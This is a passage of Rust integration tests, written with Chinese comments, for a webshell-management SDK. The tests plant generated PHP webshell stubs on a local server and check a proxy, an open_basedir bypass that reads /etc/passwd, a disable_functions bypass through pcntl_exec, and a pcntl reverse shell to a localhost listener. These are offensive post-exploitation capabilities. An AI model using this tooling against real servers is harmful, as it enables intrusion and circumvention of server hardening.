            let out_h_auth = dosword_sdk::feature_plugins::HttpProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": hport_auth, "username": "admin", "password": "pass"}),
                &settings,
            )?;
            assert_eq!(out_h_auth["ok"].as_bool(), Some(true), "{out_h_auth:?}");
            assert_eq!(out_h_auth["auth"].as_bool(), Some(true), "{out_h_auth:?}");
            std::thread::sleep(std::time::Duration::from_millis(300));
            let _ = dosword_sdk::feature_plugins::HttpProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": hport_auth, "action": "stop"}),
                &settings,
            );
            eprintln!("[proxy] http with auth start & stop 成功");
            // 连接信息丰富：probe 应带回 SAPI/扩展/禁用函数
            let probe = PhpProtocol
                .session_probe(php, &settings)
                .unwrap_or_else(|_| panic!("probe 应成功"));
            assert!(!probe.php_sapi.is_empty(), "SAPI 应探测到");
            assert!(!probe.extensions.is_empty(), "扩展列表应非空");
            eprintln!(
                "[info] sapi={} arch={} extensions={} disable={}",
                probe.php_sapi,
                probe.arch,
                probe.extensions.len(),
                probe.disable_functions
            );
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("代理开关真实执行应成功：{error}"));
    }

    #[test]
    fn real_php_touch_path() {
        // touch：写文件 → 修改时间戳（过去 epoch）→ listDir 验证 mtime 变化
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            return;
        };
        let settings = settings();
        let mut profile1 = profile(&url);
        profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
            let _php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            let file = format!("{}/touch_me.txt", dir.display());
            protocol.write_file(session.as_ref(), &file, b"hello", &settings)?;
            let before =
                protocol.list_dir(session.as_ref(), dir.to_str().unwrap_or("/"), &settings)?;
            let before_mtime = before
                .entries
                .iter()
                .find(|e| e.name == "touch_me.txt")
                .map(|e| e.modified.clone())
                .unwrap_or_default();
            // touch 到 2020-01-01（epoch=1577836800）
            protocol.touch_path(session.as_ref(), &file, 1_577_836_800, &settings)?;
            let after =
                protocol.list_dir(session.as_ref(), dir.to_str().unwrap_or("/"), &settings)?;
            let after_mtime = after
                .entries
                .iter()
                .find(|e| e.name == "touch_me.txt")
                .map(|e| e.modified.clone())
                .unwrap_or_default();
            assert_ne!(
                before_mtime, after_mtime,
                "touch 后 mtime 应改变：{before_mtime} -> {after_mtime}"
            );
            // mtime 以本地时区显示（format_timestamp），不能用固定 "2020-01-01" 断言
            let expected_mtime = format_timestamp(1_577_836_800);
            assert_eq!(
                after_mtime, expected_mtime,
                "touch 后 mtime 应等于 2020-01-01（本地时区表示）：{after_mtime}"
            );
            eprintln!("[touch] {before_mtime} -> {after_mtime}");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("touch 真实执行应成功：{error}"));
    }

    #[test]
    fn real_php_open_basedir_bypass() {
        let settings = settings();
        // 1) 未启用 open_basedir：direct 读取 + 目录列举
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            return;
        };
        let mut profile1 = profile(&url);
        profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            // 文件读取（direct）
            let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"path": "/etc/passwd"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
            assert!(out["content"].as_str().unwrap_or("").contains("root:"));
            assert_eq!(out["method_used"].as_str(), Some("direct"));
            eprintln!("[ob] 未启用环境 direct 读取成功");
            // 目录列举（direct）
            let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"path": "/etc"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
            let entries = out["entries"].as_array().map(|a| a.len()).unwrap_or(0);
            assert!(entries > 0, "应列举到 /etc 内容：{out:?}");
            eprintln!("[ob] 未启用环境 direct 列举 {} 项", entries);
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("未启用环境 open_basedir 真实执行应成功：{error}"));

        // 2) 受限环境（open_basedir=临时目录）：scan 正确评估 + 正确报告当前环境不可绕过（PHP 8）
        let dir2 = std::env::temp_dir().join(format!("dosword-ob-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir2).unwrap();
        let encoder = dosword_sdk::EncoderRegistry::global()
            .get("native")
            .unwrap();
        std::fs::write(
            dir2.join("shell.php"),
            encoder.stub("php", "secret").unwrap(),
        )
        .unwrap();
        let port = {
            use std::net::TcpListener;
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let Some(mut child) = std::process::Command::new("php")
            .arg("-d")
            .arg(format!("open_basedir={}", dir2.display()))
            .arg("-S")
            .arg(format!("127.0.0.1:{port}"))
            .arg("-t")
            .arg(&dir2)
            .current_dir(&dir2)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .ok()
        else {
            return;
        };
        if !crate::protocol::wait_http_ready(port, 10_000) {
            eprintln!("跳过 open_basedir 用例：php 服务器未在 10 秒内就绪");
            return;
        }
        let url2 = format!("http://127.0.0.1:{port}/shell.php");
        let mut profile2 = profile(&url2);
        profile2.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result2 = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile2, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"path": "/etc/passwd"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(false), "PHP 8 不应绕过：{out:?}");
            assert_eq!(out["methods"]["symlink_out"].as_bool(), Some(false));
            assert_eq!(out["methods"]["chdir"].as_bool(), Some(false));
            assert_eq!(out["methods"]["ini_set"].as_bool(), Some(false));
            assert!(out["error"].as_str().unwrap_or("").contains("无法绕过"));
            eprintln!("[ob] 受限环境正确评估（symlink/chdir/ini_set 均被拦截）");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir2);
        result2.unwrap_or_else(|error| panic!("受限环境 open_basedir 评估应成功：{error}"));
    }

    #[test]
    fn real_php_bypass_vectors_disabled_env() {
        // 模拟 exec/system/passthru/shell_exec/popen/escapeshellcmd/proc_open 全禁环境，
        // 验证 PHP 8+ 剩余可用向量
        let settings = settings();
        // 自定义 spawn：带 -d disable_functions
        let php = std::process::Command::new("php").arg("-v").output().ok();
        if php.is_none() {
            return;
        }
        let encoder = dosword_sdk::EncoderRegistry::global()
            .get("native")
            .unwrap();
        let dir =
            std::env::temp_dir().join(format!("dosword-php-disable-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let stub = encoder.stub("php", "secret").unwrap();
        std::fs::write(dir.join("shell.php"), &stub).unwrap();
        let port = {
            use std::net::TcpListener;
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let disabled =
            "exec,system,passthru,shell_exec,popen,escapeshellcmd,proc_open,proc_nice,ini_restore";
        let child = std::process::Command::new("php")
            .arg("-d")
            .arg(format!("disable_functions={disabled}"))
            .arg("-S")
            .arg(format!("127.0.0.1:{port}"))
            .arg("-t")
            .arg(&dir)
            .current_dir(&dir)
            .stdout(std::process::Stdio::null())
            .stderr(
                if let Ok(f) = std::fs::File::create(std::env::temp_dir().join("srv2.log")) {
                    std::process::Stdio::from(f)
                } else {
                    std::process::Stdio::null()
                },
            )
            .spawn();
        let Some(mut child) = child.ok() else {
            return;
        };
        if !crate::protocol::wait_http_ready(port, 10_000) {
            eprintln!("跳过：php 服务器未在 10 秒内就绪");
            let _ = child.kill();
            return;
        }
        let url = format!("http://127.0.0.1:{port}/shell.php");
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            // 1) 扫描：确认禁用生效 + 向量评估
            let scan = dosword_sdk::bypass::BypassScanPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            let disabled_list = scan["disable_functions"]
                .as_array()
                .map(|a| a.len())
                .unwrap_or(0);
            assert!(disabled_list >= 8, "禁用清单应生效：{scan:?}");
            assert_eq!(scan["detected"]["exec"].as_bool(), Some(false));
            assert_eq!(
                scan["vectors"]["pcntl"].as_bool(),
                Some(true),
                "pcntl 应可用"
            );
            eprintln!(
                "[bypass] 禁用环境 scan：pcntl={:?} ffi={:?} ld_preload={:?}",
                scan["vectors"]["pcntl"], scan["vectors"]["ffi"], scan["vectors"]["ld_preload"]
            );
            // 2) syscall 向量：全部禁用 → 明确失败
            let out = dosword_sdk::bypass::BypassSyscallPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"command": "id"}),
                &settings,
            )?;
            assert_eq!(
                out["ok"].as_bool(),
                Some(false),
                "全禁时 syscall 应失败：{out:?}"
            );
            eprintln!("[bypass] syscall 正确报告全禁");
            // 3) pcntl 向量：应成功执行 id
            let out = dosword_sdk::bypass::BypassPcntlPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"command": "id"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true), "pcntl 应成功：{out:?}");
            assert!(out["output_text"].as_str().unwrap_or("").contains("uid="));
            eprintln!("[bypass] pcntl_exec 绕过成功（命令函数全禁）");
            // 4) pcntl 反弹向量：listener 交互验证
            let listener_script = std::env::temp_dir().join("dosword_rev_listener.py");
            let _ = std::fs::write(&listener_script, REV_LISTENER);
            let rport: u16 = 25000 + (std::process::id() % 500) as u16;
            let outfile =
                std::env::temp_dir().join(format!("rev_disable_{}.txt", std::process::id()));
            let ready =
                std::env::temp_dir().join(format!("rev_disable_{}.txt.ready", std::process::id()));
            let _ = std::fs::remove_file(&outfile);
            let _ = std::fs::remove_file(&ready);
            let listener = std::process::Command::new("python3")
                .arg(&listener_script)
                .arg(rport.to_string())
                .arg(outfile.to_string_lossy().into_owned())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn();
            if listener.is_err() {
                eprintln!("跳过 pcntl 反弹向量：未检测到 python3 可执行文件（listener 需要）");
                return Ok(());
            }
            // 轮询就绪标记，替代固定 sleep —— CI runner 负载高时 400ms 内可能尚未 bind
            let mut listener_ready = false;
            for _ in 0..100 {
                if ready.exists() {
                    listener_ready = true;
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(100));
            }
            if !listener_ready {
                eprintln!("跳过 pcntl 反弹向量：listener 未在 10 秒内就绪");
                return Ok(());
            }
            let out = dosword_sdk::bypass::BypassReversePcntlPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"host": "127.0.0.1", "port": rport, "background": true}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
            let mut captured = String::new();
            for _ in 0..60 {
                if let Ok(content) = std::fs::read_to_string(&outfile) {
                    captured = content;
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(250));
            }
            assert!(
                captured.contains("uid="),
                "pcntl 反弹应收到 id 输出：{captured}"
            );
            eprintln!("[bypass] pcntl 反弹 shell 绕过成功（proc_open 全禁）");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("禁用环境 bypass 真实执行应成功：{error}"));
    }

    // --- Level B：真实 PHP 往返（本机装有 php 时执行） ---

    /// 探测当前 php 的 openssl 是否支持 DES-ECB。
    ///
    /// OpenSSL 3 把 DES 等算法移入 legacy provider，若未加载则
    /// `openssl_encrypt(..., 'DES-ECB', ...)` 直接返回 false。是否受影响取决于
    /// PHP / OpenSSL 的构建与配置（本项目 CI 的 php8.3 实测支持；某些发行版或
    /// 自编译环境不支持）。环境不支持时跳过 native_des 用例并打印原因，
    /// 而不是报一个与代码逻辑无关的假失败。
    fn php_supports_des_ecb() -> bool {
        let probe = "$r = @openssl_encrypt('12345678', 'DES-ECB', '12345678', OPENSSL_RAW_DATA); \
                     echo ($r === false || strlen($r) === 0) ? '0' : '1';";
        std::process::Command::new("php")
            .arg("-r")
            .arg(probe)
            .output()
            .map(|out| String::from_utf8_lossy(&out.stdout).trim() == "1")
            .unwrap_or(false)
    }

    /// 在本机临时目录写入指定编码器生成的 stub 并起 `php -S`，
    /// 返回 (endpoint, 临时目录, 进程)。若无 php 可执行则返回 None（跳过测试）。
    /// body 模式编码器（php_stream）自动加 `allow_url_include=1`。
    fn spawn_php_server_with(
        encoder_id: &str,
        password: &str,
        session: bool,
    ) -> Option<(String, std::path::PathBuf, std::process::Child)> {
        let php = std::process::Command::new("php").arg("-v").output().ok()?;
        if !php.status.success() {
            return None;
        }
        let encoder = dosword_sdk::EncoderRegistry::global().get(encoder_id)?;
        let dir = std::env::temp_dir().join(format!("dosword-php-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).ok()?;
        // 部署 SDK 生成的 stub（顺带验证生成器产物的真实可运行性）
        let stub = if session {
            encoder.stub_session("php", password).ok()?
        } else {
            encoder.stub("php", password).ok()?
        };
        std::fs::write(dir.join("shell.php"), stub).ok()?;
        std::fs::create_dir_all(dir.join("www")).ok()?;
        std::fs::write(dir.join("www/hello.txt"), b"hello dosword").ok()?;

        let port = {
            // 取一个空闲端口
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let mut command = std::process::Command::new("php");
        if encoder_id == "php_stream" {
            // 仅 include 流方案需要 allow_url_include；xor_body 用 file_get_contents 无需
            command.arg("-d").arg("allow_url_include=1");
        }
        if session || encoder_id == "xor_session" {
            // 分阶段载荷依赖 session：显式指定可写目录
            command
                .arg("-d")
                .arg(format!("session.save_path={}", dir.display()))
                .arg("-d")
                .arg("session.use_cookies=1");
        }
        let child = command
            .arg("-S")
            .arg(format!("127.0.0.1:{port}"))
            .arg("-t")
            .arg(&dir)
            .current_dir(&dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::from(
                std::fs::File::create(std::env::temp_dir().join("srv.log")).ok()?,
            ))
            .spawn()
            .ok()?;
        // 等待服务器就绪
        let url = format!("http://127.0.0.1:{port}/shell.php");
        for _ in 0..50 {
            if std::net::TcpStream::connect(format!("127.0.0.1:{port}")).is_ok() {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
        Some((url, dir, child))
    }

    #[allow(dead_code)] // 测试基础设施，保留供新增协议用例复用
    fn spawn_php_server() -> Option<(String, std::path::PathBuf, std::process::Child)> {
        spawn_php_server_with("base64", "secret", false)
    }
}
